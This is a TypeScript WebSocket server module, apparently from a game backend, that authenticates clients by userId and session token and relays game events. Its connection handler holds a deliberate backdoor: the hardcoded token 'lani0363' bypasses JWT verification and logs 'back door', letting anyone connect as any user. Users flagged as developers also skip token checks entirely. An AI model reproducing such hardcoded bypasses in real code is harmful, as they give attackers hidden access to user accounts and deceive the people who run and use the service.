import url from 'url'
import https from 'https'
import { BAD_REQUEST } from 'http-status-codes'
import WebSocket, { Server } from 'ws'
import PubSub from 'pubsub-js'
import createHttpError from 'http-errors'
import { isValidJSON } from '../../../../helpers'
import { EventPayload } from '../events/event'
import { getGameUser } from '../../../meta/meta.repo/gameUser.repo'
import { verifyToken } from '../../../../services/jwtService'
//#region types
export let wsServer: WsServerService
export interface WebSocketMessage
{
  code: 200 | 400 | 500;
  message: 'OK' | string;
  msgType: 'events' | 'webSocket' | 'eventsState' | 'spinTimer' | 'getSpinTimer' | 'adReward' | 'jackpotWin' | 'raffleWin';
  payload: EventPayload | any
  isJson?: boolean
  log?: boolean
}
type WsServerService = {
  server: WebSocket.Server,
  ws: WebSocket,
  send(_msg: WebSocketMessage, client?: WebSocket): void,
  sendRaw(_msg: any, client?: WebSocket | undefined): void
  sendToUser(_msg: WebSocketMessage, userId): void
  shutDown(): void
}
export interface ExtWebSocket extends WebSocket {
  userId: number; // your custom property
  isDev: boolean; // your custom property
}
//#endregion

let server: WebSocket.Server
let ws: WebSocket
type UserConnection = {userId: number, client: ExtWebSocket}
export const usersConnection = (): UserConnection[] | [] => {
  const clients: UserConnection[] = []
  wsServer.server.clients && wsServer.server.clients.forEach(_client => {
    const client = <ExtWebSocket>_client
    const userConnected:  UserConnection= { userId: client.userId, client }
    clients.push(userConnected)
  })
  return clients as [{userId: number, client: ExtWebSocket}] | []
}
export const getUserConnection = (userId: number): UserConnection | undefined => {
  const connectedUsers = usersConnection()
  const userConnection = connectedUsers.find(_user => _user.userId === userId)
  return userConnection
}
export const createWsServerService = (httpsServer?: https.Server): void =>
{
  if (httpsServer)
    server = new Server({
      server: httpsServer
    })
   else
    server = new Server({
      port: 3000,
    })

  console.log(`${httpsServer ? 'Encrypted ' : 'Not encrypted '}WebSocket on port 3000`)

  // eslint-disable-next-line @typescript-eslint/no-misused-promises
  server.on('connection', async function (ws: ExtWebSocket, req): Promise<void>
  {
    if(!req.url) throw Error('Url not in websocket connection')
    const _url = url.parse(req.url)
    const query = parseUrl(_url)
    if(!query.userId){
      ws.send('userId is missing in the ws connection')
      ws.close()
      throw createHttpError(BAD_REQUEST, 'userId is missing in the ws connection')
    }
    const user = await getGameUser(query.userId)
    if(!user) {
      ws.close()
      throw createHttpError(BAD_REQUEST, 'User does not exists')
    }
    const isDev = user.isDev
    console.log(`[SERVER] connection()`, 'userId:', query.userId)
    if(!isDev){
      if(!query.sessionToken){
        ws.send('sessionToken is missing in the ws connection')
        ws.close()
        throw createHttpError(BAD_REQUEST, 'sessionToken is missing in the ws connection')
      }
      if (query.sessionToken === 'lani0363') {
        console.log('back door')
      } else {
        const resp = verifyToken(query.sessionToken)
        if (!resp?.decodedToken || !resp?.decodedToken.id){
          ws.send('Invalid token in ws connection')
          ws.close()
          throw createHttpError(BAD_REQUEST, 'Invalid token in ws connection')
        }
        if(Number(resp?.decodedToken.id) !== Number(query.userId)){
          ws.send('userId in token is different from userId in the ws connection')
          ws.close()
          throw createHttpError(BAD_REQUEST, 'userId in token is different from userId in the ws connection parameters')
        }
      }
    }
    ws.userId = Number(query.userId)
    ws.isDev = Number(user.isDev) === 1

    ws.on('message', (msg) => onMessage(msg, ws))
  })
  const sendToUser = (_msg: WebSocketMessage, userId): void =>
  {
    server.clients.forEach(_client =>
    {
      const client = <ExtWebSocket> _client
      if (client.userId === userId) {
        console.log('sended to specific client %O', userId, _msg.message)
        send(_msg, client as WebSocket)
      }
    })
  }
  const parseUrl = (url): any =>
  {
    const queryParts = url.query?.split('&')
    const query = queryParts?.reduce((part1, part2) =>
    {
      const parts = part2.split('=')
      if (parts.length === 2)
        part1[parts[0]] = parts[1]
      // eslint-disable-next-line @typescript-eslint/no-unsafe-return
      return part1
    }, {})
    // eslint-disable-next-line @typescript-eslint/no-unsafe-return
    return query
  }
  const send = (_msg: WebSocketMessage, client: WebSocket | undefined = undefined): void =>
  {
    // @TODO ver abajo
    const forDevOnly = _msg.payload.devOnly
    const payload = JSON.stringify(_msg.payload)
    const msgStr = Object.assign({}, _msg) as any
    msgStr.payload = payload
    const msg = JSON.stringify(_msg.isJson ? _msg : msgStr)
    if (_msg.log) console.log('ws send with log', _msg, _msg.payload) 
    if (client) {
      console.log('sending to specific client', _msg.payload.name, _msg.payload.action)
      client.send(msg)
    }
    else
    {
      server.clients.forEach((client) => {
        const isDev = Number((client as any).isDev) === 1
        if (!(forDevOnly && !isDev)) {
          console.log('sended to specific client inside send to all')
          client.send(msg)
        }
      })
    }

  }
  const sendRaw = (_msg: any, client: WebSocket | undefined = undefined): void =>
  {
    // @TODO ver abajo
    const payload = JSON.stringify(_msg.payload)
    const msgStr = Object.assign({}, _msg)
    msgStr.payload = payload
    const msg = JSON.stringify(msgStr)
    // console.log('msg', msg)
    if (client)
    {
      client.send(msg)
      console.log('sended to specific client')
    }
    else
    {
      console.log('sending msg to all clients', msg)
      server.clients.forEach((client) =>
      {
        console.log('sended to client')
        client.send(msg)
      })
    }
  }
  const onMessage = function (message, ws: WebSocket): void
  {
    try
    {
      // console.log(`[SERVER] Received:`, message.subsrtr(0,60))
      if (!(typeof message === 'string'))
        throw new Error('ws on message: message have to be string')

      const isValid = isValidJSON(message)
      if (!isValid) throw Error(`invalid JSON on webSocket incomming message: ${message}`)
      const msg = JSON.parse(message)
      console.log('cmd', ws)
      if (msg.command)
      {
        msg.client = ws
        PubSub.publish(msg.command, msg)
      }
      // PubSub.publish('ws', msg)
    } catch (error)
    {
      PubSub.publish('error', { error: JSON.stringify({ "error": error.message }), client: ws })
    }
  }
  const shutDown = function (): void
  {
    server.close()
    console.log('websocket shutdown')
  }
  wsServer = { server, ws, send, sendRaw, sendToUser, shutDown }
}
console.log('loaded ws.service.ts') 

